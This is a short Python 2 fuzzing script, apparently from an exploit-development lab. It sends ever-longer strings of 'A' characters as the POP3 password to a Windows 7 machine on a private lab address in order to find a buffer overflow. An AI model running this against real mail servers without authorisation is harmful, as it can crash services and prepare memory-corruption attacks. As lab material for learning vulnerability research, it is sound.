#!/usr/bin/python
import socket

# Create an array where each item in the array will be a string of As
buffer=["A"]
counter=100

# Use a loop to build the array, first with 100 As, then 300, then 500, etc.
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

# Try each string of As in the array as a password value
for string in buffer:
    print "Fuzzing PASS with %s bytes" % len(string)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to Windows 7 machine IP, POP3 service
    connect=s.connect(('192.168.56.102',110)) 
    s.recv(1024)
    s.send('USER username\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')
    s.close()
